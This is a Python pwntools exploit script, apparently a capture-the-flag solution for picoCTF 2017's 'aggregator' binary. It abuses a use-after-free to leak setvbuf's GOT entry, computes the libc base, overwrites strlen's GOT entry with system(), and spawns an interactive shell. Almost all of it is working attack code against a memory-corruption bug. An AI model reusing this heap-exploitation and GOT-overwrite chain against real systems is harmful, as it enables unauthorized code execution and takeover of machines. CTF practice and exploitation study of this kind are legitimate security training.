#!/usr/bin/python
import re
import sys
import time
import argparse
from pwn import *

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

def wait_for_prompt(r):
  print r.recvuntil("Enter command: ")
  #r.recvuntil("Your choice :")

def wait_newline_and_dump(r):
  data = r.recvuntil('\n')
  if data:
    print data.encode('hex')
    print data
  return data

def create_comment(r, comment):
  print "# %s" %comment  
  r.sendline('# %s' %comment )
  return

def remove_date_mdy(r, date):
  print "~ %s" %date
  r.sendline('~ %s' %date )
  return

def create_aggregate(r, sign, comment):
  print "a%s %s" %(sign,comment)
  r.sendline('a%s %s' %(sign,comment))
  return

def add_date_mdy(r, date, item):
  print "adding date %s %d" %(date, item)
  r.sendline( "%s %d" %(date, item))
  return

import random
random.seed("Blah")
def generate_random_date():
  month=random.randrange(0,24)
  day=random.randrange(0,62)
  year=random.randrange(0000,9999)

  date = "%2.2d-%2.2d-%4.4d" %(month,day,year)
  return date

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  parser.add_argument('--remote', '-r', action="store_true")
  args = parser.parse_args()

  libc_path = './libc_remote64.so.6'

  if args.remote:
    r = remote('shell2017.picoctf.com', 9611)
  else:
    r = process('./aggregator', env={"LD_PRELOAD":libc_path})
    #r = process('./aggregator')

  libc = ELF(libc_path)

  #b *db_aggregate_month+101
  if args.dbg:
    gdb.attach(r, """
    vmmap
    b *chain_get+47
    """)

  """
Available operations:
	# <comment>
        ~ <mm-dd-yyyy>
        <mm-dd-yyyy> <itemLong>
        a + <day-month>
        a * <day-month>
        a M <day-month>
        a m <day-month>
        a x <day-month>

Enter command:
  """
  idx = 0
  signs = ['+', '*', 'M', 'm', 'x'] 


  """
  #Attempt to just throw random data at the problem
  dates = []
  for i in range(1000):
    rand_date = generate_random_date()
    dates.append(rand_date)
  """

  year  = 1022
  month = 1
  day   = 1
  date = "%2.2d-%2.2d-%4.4d" %(month,day,year)
  date_monthyear = "%2.2d-%4.4d" %(month,year)

  #Add date with easily findable item number 
  add_date_mdy(r, date, 0x4141414142424242)
  remove_date_mdy(r, date)

  #Overwrite the area that is now freed, with an invalid command
  payload  = ''
  payload += p64(0x601f58) # GOT address of setvbuf
  payload += p64(0x000000) 
  payload += p64(0x0000FF) # ch->capacity
  payload += p64(0x000001) # ch->size
  payload += p64(0x000000) # ch->next... just null is fine...
  r.sendline(payload)
  #r.recvline()
  create_aggregate(r, '+', date_monthyear)

  r.recvline()
  leak = r.recvline(keepends=False)
  libc.address = int(leak) - libc.symbols['setvbuf']
  print "Libc base = %x" %(libc.address)
  print "Libc system() = %x" %(libc.symbols['system'])


  year  = 1022
  month = 12
  day   = 12
  date = "%2.2d-%2.2d-%4.4d" %(month,day,year)
  date_monthyear = "%2.2d-%4.4d" %(month,year)

  #Add date with easily findable item number 
  add_date_mdy(r, date, 0x4141414142424242)
  remove_date_mdy(r, date)

  #Overwrite the area that is now freed, with an invalid command
  payload  = ''
  payload += p64(0x601f00-8) # GOT address of strlen - 8
  payload += p64(0x0000000C) # This holds the day we used above
  payload += p64(0xFFFFFFFF) 
  payload += p64(0x00000001) # ch->size
  payload += p64(0x00000000) #

  r.sendline(payload)
 
  #Send value to overwrite the data pointer with
  add_date_mdy(r, date, libc.symbols['system'])
 
  r.sendline('/bin/sh -i') 
  # Drop to interactive console
  r.interactive()
